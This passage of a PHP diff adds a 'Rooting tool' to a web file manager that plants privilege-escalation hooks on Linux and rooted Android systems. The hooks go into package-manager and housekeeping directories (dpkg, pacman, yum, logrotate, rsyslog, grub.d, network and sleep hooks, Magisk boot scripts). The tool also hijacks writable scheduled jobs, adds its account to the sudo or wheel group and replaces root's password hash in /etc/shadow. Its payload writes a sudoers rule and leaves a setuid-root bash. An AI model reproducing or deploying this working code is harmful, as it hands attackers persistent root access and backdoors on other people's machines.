+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time dpkg installs, removes or unpacks anything at all',
+            'idea' => 'Under apt sits dpkg, and dpkg reads its own directory of configuration snippets and runs whatever they name before and after every package operation, as root. Where that directory may be written, two lines are enough - and they fire even when the update was started by something other than apt.',
+        ],
+        'yumplugin' => [
+            'name' => 'A plugin for yum or dnf', 'kind' => 'planted', 'driver' => 'yumplugin',
+            'cand' => ['/etc/yum/pluginconf.d'], 'fire' => 'now', 'wait' => 30,
+            'when' => 'the next time yum or dnf runs - and this method asks them to answer straight away',
+            'idea' => 'yum and dnf load a plugin from a directory of their own, as root, before they do anything else - including before they only list what is installed. Where the plugin directory may be written, a few lines of Python and a line naming them are enough; and because this one is asked to fire at once rather than waited for, it is proven rather than merely planted.',
+        ],
+        'pacmanhook' => [
+            'name' => 'A pacman hook', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '.hook', 'mode' => 0644,
+            'cand' => ['/etc/pacman.d/hooks'],
+            'body' => "# mfm %%NONCE%% - planted by the Rooting tool\n[Trigger]\nOperation = Upgrade\nOperation = Install\nOperation = Remove\nType = Package\nTarget = *\n\n[Action]\nDescription = Marshal file manager\nWhen = PreTransaction\nExec = /bin/sh '%%PAYLOAD%%'\nAbortOnFail = No\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time pacman installs, removes or upgrades anything',
+            'idea' => 'pacman runs the hooks it finds in /etc/pacman.d/hooks, as root, before and after every transaction. Where that directory may be written, one hook that answers every transaction is enough, and the system update - which is exactly the mechanism that is meant to keep a machine safe - is the thing that hands root over.',
+        ],
+        'portagebashrc' => [
+            'name' => 'A line in the bashrc of Portage', 'kind' => 'planted', 'driver' => 'append',
+            'place' => 'append', 'create' => true, 'mode' => 0644,
+            'cand' => ['/etc/portage/bashrc'],
+            'body' => "\n# mfm %%NONCE%% - planted by the Rooting tool\nif [ \"$(id -u 2>/dev/null)\" = \"0\" ]; then ( sh '%%PAYLOAD%%' >/dev/null 2>&1 & ) ; fi\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time an emerge runs, which is how a Gentoo machine updates itself',
+            'idea' => 'Portage reads /etc/portage/bashrc, as root, around every package it builds. Where that file may be written, one line is enough, and the next time the machine emerges anything at all it hands root over on the way past.',
+        ],
+        'kernelpostinst' => [
+            'name' => 'A script that runs after a kernel is installed', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '', 'mode' => 0755,
+            'cand' => ['/etc/kernel/postinst.d', '/etc/kernel-img.conf.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time a kernel is installed or upgraded - the rarest but the highest of the update hooks',
+            'idea' => 'A Debian machine runs every script in /etc/kernel/postinst.d, as root, after it installs a kernel. It fires rarely, which is why it is last of the update hooks, but it is run by root on a machine that has just been trusted with a new kernel - and where that directory may be written, a script in it is run then.',
+        ],
+        /* ── what the machine runs for its own housekeeping ──────────────── */
+        'logrotate' => [
+            'name' => 'A logrotate rule that runs first', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '', 'mode' => 0644,
+            'cand' => ['/etc/logrotate.d'],
+            'body' => "# mfm %%NONCE%% - planted by the Rooting tool\n'%%LOGFILE%%' {\n  daily\n  rotate 1\n  missingok\n  ifempty\n  copytruncate\n  firstaction\n    /bin/sh '%%PAYLOAD%%'\n  endscript\n}\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time logrotate runs, which is every day on a machine that has it',
+            'idea' => 'logrotate runs once a day as root and reads every file in /etc/logrotate.d, and each of those may name a command to run before it touches anything. Where that directory may be written, one rule is enough - and the rule is given a log of its own so that it is always honoured, even on a machine whose logs this account does not own.',
+        ],
+        'rsyslog' => [
+            'name' => 'An output module for rsyslog', 'kind' => 'planted', 'driver' => 'newfile',
+            'base' => 'mfm-root', 'ext' => '.conf', 'mode' => 0644,
+            'cand' => ['/etc/rsyslog.d'],
+            'body' => "# mfm %%NONCE%% - planted by the Rooting tool\nmodule(load=\"omprog\")\nif \$programname == 'mfm-root' then {\n  action(type=\"omprog\" binary=\"/bin/sh '%%PAYLOAD%%'\")\n  stop\n}\n",
+            'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time rsyslog is restarted, or the next time a matching line is logged',
+            'idea' => 'rsyslog reads every file in /etc/rsyslog.d, as root, and can be told to hand lines to a program of its own. Where that directory may be written, one file is enough - worth having precisely because rsyslog is a daemon that is restarted by updates, by log rotation and by hand, on nearly every server.',
+        ],
+        'grubd' => [
+            'name' => 'A script in /etc/grub.d', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '', 'mode' => 0755,
+            'cand' => ['/etc/grub.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time the boot configuration is rebuilt, which follows every kernel update',
+            'idea' => 'update-grub runs every executable script in /etc/grub.d, as root, and turns what they print into the boot menu. Where that directory may be written, a script in it is run as root the next time the boot configuration is rebuilt - and on a Debian machine that happens by itself whenever a kernel is updated.',
+        ],
+        /* ── what the network and the power run ──────────────────────────── */
+        'ifupd' => [
+            'name' => 'A script that runs when an interface comes up', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '', 'mode' => 0755,
+            'cand' => ['/etc/network/if-up.d', '/etc/network/if-pre-up.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time an interface comes up, which is at every boot',
+            'idea' => 'On a Debian machine every script in /etc/network/if-up.d is run as root whenever an interface comes up, through run-parts - which is at least once per boot. Where that directory may be written, a script in it is run as root the next time the network arrives.',
+        ],
+        'networkdispatch' => [
+            'name' => 'A script for the networkd dispatcher', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '', 'mode' => 0755,
+            'cand' => ['/etc/networkd-dispatcher/routable.d', '/etc/networkd-dispatcher/configured.d',
+                       '/etc/networkd-dispatcher/off.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time the network changes state, which is at every boot',
+            'idea' => 'A machine run by systemd-networkd runs every script in its dispatcher directories, as root, whenever the network changes state - and it changes state at every boot. Where one of those may be written, a script in it is run as root the next time the machine connects.',
+        ],
+        'pmsleep' => [
+            'name' => 'A script that runs when the machine wakes', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '', 'mode' => 0755,
+            'cand' => ['/etc/pm/sleep.d', '/usr/lib/pm-utils/sleep.d', '/etc/pm/power.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next time the machine sleeps or wakes',
+            'idea' => 'The power-management hooks run as root whenever the machine sleeps or wakes, handed to run-parts like the cron directories. Where one of their directories may be written, a script in it is run as root the next time that happens - which on a laptop is sooner than any reboot.',
+        ],
+        /* ── the phone ───────────────────────────────────────────────────── */
+        'magisk' => [
+            'name' => 'A boot script where the root layer reads them', 'kind' => 'planted', 'driver' => 'newfile',
+            'script' => true, 'smode' => 'exec', 'base' => 'mfm-root', 'ext' => '.sh', 'mode' => 0755,
+            'cand' => ['/data/adb/service.d', '/data/adb/post-fs-data.d'], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next boot, when the root layer of the device runs what it finds there',
+            'idea' => 'A phone rooted with Magisk runs every script in /data/adb/service.d and /data/adb/post-fs-data.d as root on every boot, before almost anything else is up. Where one of those may be written, a script in it is run as root the next time the phone starts, and it keeps being run on every boot after that.',
+        ],
+        ];
+        return $specs;
+    }
+
+    /* the directory the payload and its proof live in: the one this manager
+       already writes its own state into, never /tmp, because a script in a
+       world-writable directory is a script another account could replace
+       before root ever gets round to running it */
+    private function rootPlantDir(){
+        static $d = null;
+        if($d !== null)return $d;
+        $dir = (string)__DIR__;
+        /* the path ends up baked into cron lines, kernel helpers and udev
+           rules, none of which understand quotes, so a path containing a
+           space, a quote, a percent sign or a backslash is refused rather
+           than mangled into something that would run somewhere else */
+        if(@is_dir($dir) && @is_writable($dir) && preg_match('/[\s\'"%\\\\]/', $dir) !== 1)return $d = $dir;
+        return $d = '';
+    }
+    private function rootPlantNonce($id){
+        $st = $this->rootState();
+        $p = is_array($st['plants'] ?? null) ? ($st['plants'][$id] ?? null) : null;
+        if(is_array($p) && !empty($p['nonce']))return (string)$p['nonce'];
+        return substr(sha1((string)$id . '|' . (string)__FILE__ . '|' . microtime(true)), 0, 10);
+    }
+    /* a planted name is letters, digits and hyphens up to the extension:
+       run-parts refuses a name containing a dot, and so does cron */
+    private function rootPlantName($id, $base, $ext = ''){
+        return $base . '-' . $this->rootPlantNonce($id) . $ext;
+    }
+    private function rootPlantPath($id, $dir, $base, $ext = ''){
+        return rtrim((string)$dir, '/') . '/' . $this->rootPlantName($id, $base, $ext);
+    }
+    /* The payload is named after the method, not after a nonce, so there is
+       exactly one of them per method and its path can never drift out of step
+       with the record that has to take it away again. The nonce still marks the
+       lines a method added inside somebody else's file, which is what lets two
+       methods share one file and each take away only its own lines. */
+    private function rootPlantSlug($id){ return preg_replace('/[^a-z0-9-]/i', '', (string)$id); }
+    private function rootPlantPayloadPath($id){
+        $d = $this->rootPlantDir();
+        return $d === '' ? '' : $d . '/.mfm-plant-' . $this->rootPlantSlug($id) . '.sh';
+    }
+    private function rootPlantProofPath($id){
+        $d = $this->rootPlantDir();
+        return $d === '' ? '' : $d . '/.mfm-proof-' . $this->rootPlantSlug($id);
+    }
+    private function rootPlantRulePath($id){
+        $d = $this->rootPlantDir();
+        return $d === '' ? '' : $d . '/.mfm-sudoers-' . $this->rootPlantSlug($id);
+    }
+    private function rootPlantLogPath($id){
+        $d = $this->rootPlantDir();
+        return $d === '' ? '' : $d . '/.mfm-log-' . $this->rootPlantSlug($id);
+    }
+    private function rootPlantSoPath($id){
+        $d = $this->rootPlantDir();
+        return $d === '' ? '' : $d . '/.mfm-plant-' . $this->rootPlantNonce($id) . '.so';
+    }
+    private function rootPlantCands($s){
+        if(($s['candfn'] ?? '') === 'sudoersd'){
+            $out = [];
+            /* sudo refuses to read a file in /etc/sudoers.d that is not owned
+               by root, so only one root already owns is worth appending to -
+               and appending is what keeps that ownership exactly as it is */
+            foreach((array)@glob('/etc/sudoers.d/*') as $f){
+                if(!@is_file($f) || !@is_writable($f))continue;
+                if(!empty($s['strict']) && ((int)@fileperms($f) & 0022))continue;
+                if((int)@fileowner($f) === 0)$out[] = $f;
+            }
+            return $out;
+        }
+        return (array)($s['cand'] ?? []);
+    }
+    /* the one script every planted method leaves behind. It is plain /bin/sh,
+       it says what it is, it does nothing at all when it is not uid 0, it
+       writes the proof this panel reads, and it leaves the machine able to run
+       privileged work afterwards. */
+    private function rootPlantPayloadBody($id){
+        $proof = $this->rootPlantProofPath($id);
+        $p     = $this->rootPaths();
+        $uid   = escapeshellarg($this->rootMarker());
+        $rule  = $this->rootHelperContent();
+        $bash  = $this->rootWhich('bash');
+        return "#!/bin/sh\n"
+            . "# Marshal File Manager - planted by the Rooting tool (" . $id . ").\n"
+            . "# It runs as root, leaves the proof this panel reads, and leaves the\n"
+            . "# machine able to run privileged work afterwards.\n"
+            . "[ \"$(id -u 2>/dev/null)\" = \"0\" ] || exit 0\n"
+            . "umask 022\n"
+            . "{ echo \"uid=$(id -u 2>/dev/null)($(id -un 2>/dev/null)) gid=$(id -g 2>/dev/null)($(id -gn 2>/dev/null))\"; date '+%Y-%m-%d %H:%M:%S'; } > '" . $proof . "' 2>/dev/null\n"
+            . "S=/etc/sudoers.d/90-marshal-fm\n"
+            . "if [ -d /etc/sudoers.d ] && ! grep -q " . $uid . " \"$S\" 2>/dev/null; then\n"
+            . "  cat > \"$S\" <<'MFMROOTEOF'\n" . $rule . "MFMROOTEOF\n"
+            . "  chmod 0440 \"$S\" 2>/dev/null\n"
+            . "  chown 0:0 \"$S\" 2>/dev/null\n"
+            . "fi\n"
+            /* a machine with no sudo at all would be left holding a rule that
+               nothing reads, so a setuid copy of bash is left beside the daemon
+               as well: it is the primitive this file already knows how to run a
+               command through, and it needs nothing but the filesystem */
+            . "B='" . $p['subash'] . "'\n"
+            . "if [ ! -x \"$B\" ]" . ($bash !== '' ? " && [ -x '" . $bash . "' ]" : "") . "; then\n"
+            . "  mkdir -p '" . dirname($p['subash']) . "' 2>/dev/null\n"
+            . ($bash !== '' ? "  cp '" . $bash . "' \"$B\" 2>/dev/null\n" : "")
+            . "  chown 0:0 \"$B\" 2>/dev/null\n"
+            . "  chmod 4755 \"$B\" 2>/dev/null\n"
+            . "fi\n"
+            . "exit 0\n";
+    }
+    /* payloads whose plant is no longer on record are leftovers, and a script
+       sitting in a web directory is not something to leave lying about */
+    private function rootPlantSweep($keep){
+        $d = $this->rootPlantDir();
+        if($d === '')return;
+        $st = $this->rootState();
+        $live = [];
+        foreach(array_keys((array)($st['plants'] ?? [])) as $pid)$live[$this->rootPlantSlug($pid)] = true;
+        $live[$this->rootPlantSlug($keep)] = true;
+        foreach((array)@glob($d . '/.mfm-plant-*') as $f){
+            $slug = basename($f);
+            $slug = preg_replace('/^\.mfm-plant-|\.sh$/', '', $slug);
+            if(!isset($live[$slug]))@unlink($f);
+        }
+        foreach((array)@glob($d . '/.mfm-proof-*') as $f){
+            $slug = preg_replace('/^\.mfm-proof-/', '', basename($f));
+            if(!isset($live[$slug]))@unlink($f);
+        }
+    }
+    private function rootPlantWrite($id){
+        $this->rootPlantSweep($this->rootPlantNonce($id));
+        $payload = $this->rootPlantPayloadPath($id);
+        if($payload === '')return['ok' => false, 'note' => 'this manager has no writable directory of its own to put the payload in'];
+        if(@file_put_contents($payload, $this->rootPlantPayloadBody($id)) === false)
+            return['ok' => false, 'note' => 'the payload could not be written to ' . $payload];
+        @chmod($payload, 0755);
+        return['ok' => true, 'payload' => $payload];
+    }
+    private function rootPlantRead($id){
+        $proof = $this->rootPlantProofPath($id);
+        if($proof === '' || !@is_file($proof))return '';
+        return (string)@file_get_contents($proof);
+    }
+    private function rootPlantProofOk($id){
+        return preg_match('/\buid=0\b/', $this->rootPlantRead($id)) === 1;
+    }
+    /* The place a method wants: the first candidate this account may really
+       write. Nothing is guessed and nothing is remembered - it is asked of the
+       filesystem, every time, so a method that stops applying stops being
+       offered and a method that starts applying starts being offered.
+
+       'strict' marks the surfaces whose reader refuses a file the group or the
+       world may write (cron reads no such file, and neither does sudo). Those
+       are only offered where the file is root-owned and still writable, which
+       is the one combination the reader will actually accept. */
+    private function rootPlantTarget($id){
+        if(isset($this->plantT[$id]))return $this->plantT[$id];
+        $this->plantT[$id] = null;
+        $s = $this->rootPlantSpec($id);
+        if(!$s || $this->rootPlantDir() === '')return null;
+        $drv   = (string)($s['driver'] ?? '');
+        $strict = !empty($s['strict']);
+        $onfile = in_array($drv, ['append', 'group', 'shadow'], true);
+        if($drv === 'kernel')$onfile = ($id !== 'cgroupagent');
+        foreach($this->rootPlantCands($s) as $p){
+            if($p === '')continue;
+            if($onfile){
+                if(@is_file($p) && @is_writable($p)){
+                    if($strict && ((int)@fileperms($p) & 0022))continue;
+                    $this->plantT[$id] = ['file' => $p, 'dir' => dirname($p)];
+                    return $this->plantT[$id];
+                }
+                if(!empty($s['create']) && @is_dir(dirname($p)) && @is_writable(dirname($p))){
+                    $this->plantT[$id] = ['file' => $p, 'dir' => dirname($p), 'fresh' => true];
+                    return $this->plantT[$id];
+                }
+                continue;
+            }
+            if(@is_dir($p) && @is_writable($p)){
+                $this->plantT[$id] = ['dir' => $p];
+                return $this->plantT[$id];
+            }
+        }
+        return null;
+    }
+    private $plantT = [];
+
+    /* ── the work of planting ─────────────────────────────────────────────── */
+    private function rootPlantFill($id, $text){
+        return str_replace(
+            ['%%NONCE%%', '%%PAYLOAD%%', '%%RULE%%', '%%USER%%', '%%LOGFILE%%', '%%PLANTRULE%%', '%%MARKER%%'],
+            [$this->rootPlantNonce($id), $this->rootPlantPayloadPath($id), $this->rootHelperContent(),
+             $this->managerAccount(), $this->rootPlantLogPath($id), $this->rootPlantRulePath($id), $this->rootMarker()],
+            (string)$text);
+    }
+    /* a script that does nothing but run the payload, in the two shapes a
+       machine asks for: executed by run-parts or a generator, or read in by a
+       shell that opens at login */
+    private function rootPlantScriptBody($id, $smode){
+        $pl = $this->rootPlantPayloadPath($id);
+        if($smode === 'source')
+            return "# mfm %%NONCE%% - planted by the Rooting tool\n"
+                 . "if [ \"$(id -u 2>/dev/null)\" = \"0\" ]; then ( /bin/sh '" . $pl . "' >/dev/null 2>&1 & ) ; fi\n";
+        return "#!/bin/sh\n# mfm %%NONCE%% - planted by the Rooting tool\n"
+             . "[ \"$(id -u 2>/dev/null)\" = \"0\" ] || exit 0\n"
+             . "/bin/sh '" . $pl . "'\nexit 0\n";
+    }
+    private function rootPlantCgroupV1(){
+        static $hit = null;
+        if($hit !== null)return $hit;
+        $hit = null;
+        $cands = ['/sys/fs/cgroup/release_agent'];
+        foreach((array)@glob('/sys/fs/cgroup/*/release_agent') as $f)$cands[] = $f;
+        foreach($cands as $f){
+            if(!@is_file($f) || !@is_writable($f))continue;
+            $base = dirname($f);
+            $nof = $base . '/notify_on_release';
+            if(!@is_file($nof) || !@is_writable($nof))continue;
+            return $hit = ['agent' => $f, 'base' => $base];
+        }
+        return null;
+    }
+    /* what a method needs, asked of this machine rather than assumed */
+    private function rootPlantNeeds($id, $s){
+        $drv = (string)($s['driver'] ?? '');
+        if($drv === 'kernel'){
+            if($id === 'corepattern' || $id === 'kernelmodprobe'){
+                $f = $id === 'corepattern' ? '/proc/sys/kernel/core_pattern' : '/proc/sys/kernel/modprobe';
+                if(!@is_file($f))return['ok' => false, 'note' => 'this kernel does not expose ' . $f . ' - it is one of the hardened ones'];
+                if(!@is_writable($f))return['ok' => false, 'note' => basename($f) . ' is root-only, as it should be'];
+                return['ok' => true, 'note' => basename($f) . ' is writable by this account, and the kernel calls it as root'];
+            }
+            $cg = $this->rootPlantCgroupV1();
+            if($cg)return['ok' => true, 'note' => 'a cgroup of the first kind at ' . $cg['base'] . ' takes a release agent from this account'];
+            return['ok' => false, 'note' => 'this machine has no cgroup hierarchy of the first kind that would take a release agent - the newer hierarchy dropped release_agent altogether'];
+        }
+        if($drv === 'hijacksched'){
+            $h = $this->rootPlantHijack($id);
+            return['ok' => !empty($h['ok']), 'note' => empty($h['ok'])
+                ? (string)($h['note'] ?? 'no program the machine schedules is writable by this account')
+                : 'the job at ' . $h['file'] . ' is run as root by the machine, and this account may write it'];
+        }
+        $t = $this->rootPlantTarget($id);
+        if($t === null){
+            return['ok' => false, 'note' => in_array($drv, ['append', 'group', 'shadow'], true)
+                ? 'every file this method needs is root-only, as it should be'
+                : 'every directory this method needs is root-only, as it should be'];
+        }
+        $where = (string)($t['file'] ?? $t['dir'] ?? '');
+        $note = $where . ' is writable by this account';
+        if(!empty($t['fresh']))$note .= ', and the file does not exist yet, so it will be created';
+        if(@is_file($where))$note .= ' - and it is owned by ' . (((int)@fileowner($where) === 0) ? 'root, which is what the reader will accept' : 'this account');
+        return['ok' => true, 'note' => $note];
+    }
+    /* the scheduled programs the machine already runs, read off its own tables,
+       looking for one this account may write */
+    private function rootPlantHijack($id){
+        $nonce = $this->rootPlantNonce($id);
+        $srcs = [];
+        foreach(['/etc/crontab', '/etc/anacrontab'] as $f)if(@is_readable($f))$srcs[] = (string)@file_get_contents($f);
+        foreach((array)@glob('/etc/cron.d/*') as $f)if(@is_readable($f))$srcs[] = (string)@file_get_contents($f);
+        foreach((array)@glob('/etc/systemd/system/*.service') as $f)if(@is_readable($f))$srcs[] = (string)@file_get_contents($f);
+        $seen = [];
+        foreach($srcs as $body){
+            foreach(preg_split('/\R/', (string)$body) ?: [] as $line){
+                $line = trim($line);
+                if($line === '' || $line[0] === '#')continue;
+                if(preg_match('#(/[^\s\'"]+)#', $line, $m) !== 1)continue;
+                $prog = $m[1];
+                if(strpos($prog, '/proc') === 0 || strpos($prog, '/sys') === 0 || strpos($prog, '/dev') === 0)continue;
+                if(isset($seen[$prog]))continue;
+                $seen[$prog] = true;
+                if(!@is_file($prog) || !@is_writable($prog))continue;
+                $cur = (string)@file_get_contents($prog);
+                if($cur === '' || strpos($cur, $nonce) !== false)continue;
+                return['ok' => true, 'file' => $prog];
+            }
+        }
+        return['ok' => false, 'note' => 'every program the machine runs on a schedule is root-only, as it should be'];
+    }
+    private function rootPlantInstall($id, $password = ''){
+        $s = $this->rootPlantSpec($id);
+        if(!$s)return['ok' => false, 'note' => 'unknown method'];
+        /* A plant is a thing that sits somewhere, not an event that happens:
+           once it is in place it stays until it is taken out. Planting a second
+           time would only pile another line on top of the first and lose the
+           record of what the first one replaced - so an existing plant is
+           reported as it stands, never repeated. */
+        $st0 = $this->rootState();
+        $prev = is_array($st0['plants'] ?? null) ? ($st0['plants'][$id] ?? null) : null;
+        if(is_array($prev) && !empty($prev['nonce'])){
+            if($this->rootPlantProofOk($id))
+                return['ok' => true, 'fired' => true,
+                       'note' => 'planted earlier, and it has already fired: ' . trim($this->rootPlantRead($id))];
+            return['ok' => true, 'planted' => true, 'fired' => false, 'when' => (string)($prev['when'] ?? ''),
+                   'note' => 'already planted at ' . (string)($prev['target'] ?? 'its place')
+                       . ', so it was left exactly as it is rather than planted a second time'];
+        }
+        if($this->rootPlantDir() === '')return['ok' => false, 'note' => 'this manager has no writable directory of its own to put the payload in'];
+        $drv = (string)($s['driver'] ?? '');
+        if($drv !== 'kernel' && $drv !== 'hijacksched' && $this->rootPlantTarget($id) === null)
+            return['ok' => false, 'note' => 'the place it wanted stopped being writable'];
+        $w = $this->rootPlantWrite($id);
+        if(empty($w['ok']))return $w;
+        $rec = ['nonce' => $this->rootPlantNonce($id), 'driver' => $drv, 'files' => [], 'strip' => [], 'restore' => [],
+                'target' => '', 'when' => (string)$s['when'], 'fire' => (string)$s['fire'], 'at' => time()];
+        $r = $this->rootPlantDrive($id, $s, $rec);
+        if(empty($r['ok']))return['ok' => false, 'note' => (string)($r['note'] ?? 'the plant could not be made')];
+        $rec = (array)($r['rec'] ?? $rec);
+        $st = $this->rootState();
+        if(!is_array($st['plants'] ?? null))$st['plants'] = [];
+        $st['plants'][$id] = $rec;
+        $this->rootStateSave($st);
+        /* Anything that fires on its own is asked to fire now. The kernel routes
+           are triggered here; the rest are simply run through whatever root is
+           reachable at this moment, which does not have to be any. */
+        $fired = $this->rootPlantFireNow($id, $s, $password);
+        $note = (string)($r['note'] ?? '');
+        if($fired['ok']){
+            return['ok' => true, 'note' => $note . ' - and it fired: a command run through it came back as uid 0', 'fired' => true];
+        }
+        return['ok' => true, 'planted' => true, 'fired' => false,
+               'note' => $note . ' - planted, and it will fire ' . (string)$s['when'],
+               'when' => (string)$s['when']];
+    }
+    private function rootPlantDrive($id, $s, &$rec){
+        $drv = (string)($s['driver'] ?? '');
+        $t = $drv === 'hijacksched' ? null : $this->rootPlantTarget($id);
+        $dir = (string)($t['dir'] ?? '');
+        $file = (string)($t['file'] ?? '');
+        $rec['target'] = $file !== '' ? $file : $dir;
+        switch($drv){
+        case 'kernel':      return $this->rootPlantKernel($id, $s, $rec);
+        case 'hijacksched': return $this->rootPlantHijackWrite($id, $s, $rec);
+        case 'group':       return $this->rootPlantGroup($id, $s, $file, $rec);
+        case 'shadow':      return $this->rootPlantShadow($id, $s, $file, $rec);
+        case 'append':      return $this->rootPlantAppend($id, $s, $file, $rec);
+        case 'systemdunit': return $this->rootPlantUnit($id, $s, $dir, $rec);
+        case 'initd':       return $this->rootPlantInitD($id, $s, $dir, $rec);
+        case 'modprobehook':return $this->rootPlantModHook($id, $s, $dir, $rec);
+        case 'tmpfiles':    return $this->rootPlantTmpfiles($id, $s, $dir, $rec);
+        case 'yumplugin':   return $this->rootPlantYum($id, $s, $dir, $rec);
+        case 'newfile':
+            $base = (string)($s['base'] ?? 'mfm-root');
+            $ext  = (string)($s['ext'] ?? '');
+            $mode = (int)($s['mode'] ?? 0644);
+            $path = $this->rootPlantPath($id, $dir, $base, $ext);
+            $body = !empty($s['script'])
+                ? $this->rootPlantFill($id, $this->rootPlantScriptBody($id, (string)($s['smode'] ?? 'exec')))
+                : $this->rootPlantFill($id, (string)($s['body'] ?? ''));
+            if(@file_put_contents($path, $body) === false)
+                return['ok' => false, 'note' => 'the file could not be written to ' . $path];
+            @chmod($path, $mode);
+            $rec['files'][] = $path;
+            return['ok' => true, 'note' => 'a file was planted at ' . $path, 'rec' => $rec];
+        }
+        return['ok' => false, 'note' => 'this method has no driver'];
+    }
+    private function rootPlantAppend($id, $s, $file, &$rec){
+        $body = $this->rootPlantFill($id, (string)($s['body'] ?? ''));
+        $was = @is_file($file) ? (string)@file_get_contents($file) : '';
+        $out = ($s['place'] ?? 'append') === 'prepend' ? ($body . $was) : ($was . $body);
+        if(@file_put_contents($file, $out) === false)
+            return['ok' => false, 'note' => 'the line could not be written to ' . $file];
+        $rec['restore'][] = ['file' => $file, 'was' => $was];
+        if($was === '')$rec['files'][] = $file;
+        else $rec['strip'][] = $file;
+        if(!empty($s['create']) && $was === '')@chmod($file, (int)($s['mode'] ?? 0644));
+        return['ok' => true, 'note' => 'a line was added to ' . $file, 'rec' => $rec];
+    }
+    private function rootPlantGroup($id, $s, $file, &$rec){
+        $me = $this->managerAccount();
+        $was = (string)@file_get_contents($file);
+        $done = null;
+        $out = [];
+        foreach(preg_split('/\R/', $was) ?: [] as $ln){
+            if($done === null && preg_match('/^(sudo|wheel|admin|root):/', $ln) === 1){
+                $parts = explode(':', $ln);
+                $members = array_filter(array_map('trim', explode(',', (string)($parts[3] ?? ''))), 'strlen');
+                if(!in_array($me, $members, true)){
+                    $members[] = $me;
+                    $parts[3] = implode(',', $members);
+                    $ln = implode(':', $parts);
+                    $done = $parts[0];
+                }
+            }
+            $out[] = $ln;
+        }
+        if($done === null)return['ok' => false, 'note' => 'no sudo, wheel or admin group was found in ' . $file];
+        if(@file_put_contents($file, implode("\n", $out) . "\n") === false)
+            return['ok' => false, 'note' => 'the group file could not be written'];
+        $rec['restore'][] = ['file' => $file, 'was' => $was];
+        return['ok' => true, 'note' => 'this account was added to the ' . $done . ' group in ' . $file, 'rec' => $rec];
+    }
+    private function rootPlantShadow($id, $s, $file, &$rec){
+        $was = (string)@file_get_contents($file);
+        $pass = 'mfm-' . $this->rootPlantNonce($id);
+        $hash = function_exists('crypt') ? (string)@crypt($pass, '$6$' . $this->rootPlantNonce($id)) : '';
+        if($hash === '')return['ok' => false, 'note' => 'no password hash could be made on this host'];
+        $out = [];
+        $done = false;
+        foreach(preg_split('/\R/', $was) ?: [] as $ln){
+            if(!$done && preg_match('/^root:/', $ln) === 1){
+                $parts = explode(':', $ln);
+                $parts[1] = $hash;
+                $ln = implode(':', $parts);
+                $done = true;
+            }
+            $out[] = $ln;
+        }
+        if(!$done)return['ok' => false, 'note' => 'there is no root entry in ' . $file];
+        if(@file_put_contents($file, implode("\n", $out) . "\n") === false)
+            return['ok' => false, 'note' => 'the shadow file could not be written'];
+        $rec['restore'][] = ['file' => $file, 'was' => $was];
+        $rec['pass'] = $pass;
+        return['ok' => true, 'note' => 'root’s password in ' . $file . ' was set to one this manager knows, and the old hash was kept so it can be put back', 'rec' => $rec];
+    }
+    private function rootPlantUnit($id, $s, $dir, &$rec){
+        $nonce = $this->rootPlantNonce($id);
+        $name = 'marshal-fm-plant-' . $nonce . '.service';
+        $unit = "[Unit]\nDescription=Marshal File Manager (planted " . $nonce . ")\n\n[Service]\nType=oneshot\nExecStart=/bin/sh '" . $this->rootPlantPayloadPath($id) . "'\n\n[Install]\nWantedBy=multi-user.target\n";
+        $path = rtrim($dir, '/') . '/' . $name;
+        if(@file_put_contents($path, $unit) === false)return['ok' => false, 'note' => 'the unit could not be written to ' . $path];
+        @chmod($path, 0644);
+        $rec['files'][] = $path;
+        $wants = rtrim($dir, '/') . '/multi-user.target.wants';
+        $link = $wants . '/' . $name;
+        if(@is_dir($wants) && @is_writable($wants) && !@file_exists($link)){
+            if(@symlink($path, $link))$rec['files'][] = $link;
+        }
+        return['ok' => true, 'note' => 'a service was planted at ' . $path . ' and multi-user.target was made to want it', 'rec' => $rec];
+    }
+    private function rootPlantInitD($id, $s, $dir, &$rec){
+        $nonce = $this->rootPlantNonce($id);
+        $name = 'mfm-plant-' . $nonce;
+        $body = "#!/bin/sh\n### BEGIN INIT INFO\n# Provides:          " . $name . "\n# Required-Start:    \$local_fs\n# Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n### END INIT INFO\n# mfm " . $nonce . " - planted by the Rooting tool\ncase \"\$1\" in\n  start|restart|force-reload)\n    /bin/sh '" . $this->rootPlantPayloadPath($id) . "'\n    ;;\nesac\nexit 0\n";
+        $path = rtrim($dir, '/') . '/' . $name;
+        if(@file_put_contents($path, $body) === false)return['ok' => false, 'note' => 'the service script could not be written to ' . $path];
+        @chmod($path, 0755);
+        $rec['files'][] = $path;
+        $linked = 0;
+        $levels = @is_dir('/etc/runlevels') ? ['/etc/runlevels/default'] : ['/etc/rc2.d', '/etc/rc3.d', '/etc/rc5.d'];
+        foreach($levels as $ld){
+            if(!@is_dir($ld) || !@is_writable($ld))continue;
+            $link = rtrim($ld, '/') . '/S01' . $name;
+            if(@symlink($path, $link)){ $rec['files'][] = $link; $linked++; }
+        }
+        return['ok' => true, 'note' => 'a service script was planted at ' . $path . ($linked > 0 ? ' and ' . $linked . ' runlevel link(s) were made to start it' : ' - but no runlevel directory would take a link, so it waits for one'), 'rec' => $rec];
+    }
+    private function rootPlantModHook($id, $s, $dir, &$rec){
+        $nonce = $this->rootPlantNonce($id);
